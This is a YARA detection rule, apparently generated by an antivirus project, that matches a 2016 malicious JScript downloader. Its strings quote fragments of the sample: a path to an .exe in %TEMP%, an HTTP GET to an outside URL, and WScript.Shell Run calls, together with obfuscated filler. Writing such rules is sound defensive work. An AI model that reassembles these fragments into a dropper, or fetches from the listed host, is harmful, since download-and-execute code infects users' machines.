rule sig_20160328_3720d47be12c9e381fbb28d2a29efac1 {
  meta:
    description = "datamaliciousorder - file 20160328_3720d47be12c9e381fbb28d2a29efac1.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "f8522e93f904730e2b87dcc9246927d534d7c035a75ee8f263cdfd8019a6ba7a"

  strings:
    $s1  = "function Civyehlde() {return Lbimhuf[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"Eb9bkN70jJTOa.exe\";};" fullword ascii
    $s2  = "do {WScript[Fhmdmdm](Wranpzzqrq() * 11)} while (Muomjah[\"readystate\"] < 2 * 2);" fullword ascii
    $s3  = "function Hmdohdl(Xovxzbpdo, Sfuizokudk){return Xovxzbpdo - Sfuizokudk;};" fullword ascii
    $s4  = "Muomjah[Fsofmi](\"GET\", \"http://energyunlimited.co.nz/o2apf\", false);" fullword ascii
    $s5  = "var Lbimhuf = function Rgoxs() {return WScript[Fygqbnhsc](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Ebqugn(Iqusmdphkb){Lbimhuf[\"Run\"](Iqusmdphkb, Wgbnpfxwj, Wgbnpfxwj);};" fullword ascii
    $s7  = "function Plvibc() {return ((Jqtwfnmyew == true) && (Jqtwfnmyew == Bkxlpjvcjv)) ? 1 : Wgbnpfxwj;};" fullword ascii
    $s8  = " while (Cwxglpaz){" fullword ascii
    $s9  = "function Rgvzemir(Ikwdqnxvir) {var Vuxnt = (1, 2, 3, 4, 5, Ikwdqnxvir); return Vuxnt;};" fullword ascii
    $s10 = "return Hmdohdl(Kvkta, Almyz);" fullword ascii
    $s11 = "Bkxlpjvcjv = true; " fullword ascii
    $s12 = "Jqtwfnmyew = true; " fullword ascii
    $s13 = "function Tyouobvd(){return Fygqbnhsc;};" fullword ascii
    $s14 = "function Wranpzzqrq(){return 22;};" fullword ascii
    $s15 = "var Jqtwfnmyew = false;" fullword ascii
    $s16 = "var Gbpprwuz = false;" fullword ascii
    $s17 = "function Rtddbzz(){return Zuxlqfd;};" fullword ascii
    $s18 = "var Bkxlpjvcjv = false;" fullword ascii
    $s19 = "var Nrfyjvut = new this[\"Date\"]();" fullword ascii
    $s20 = "function Cfgiosk()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}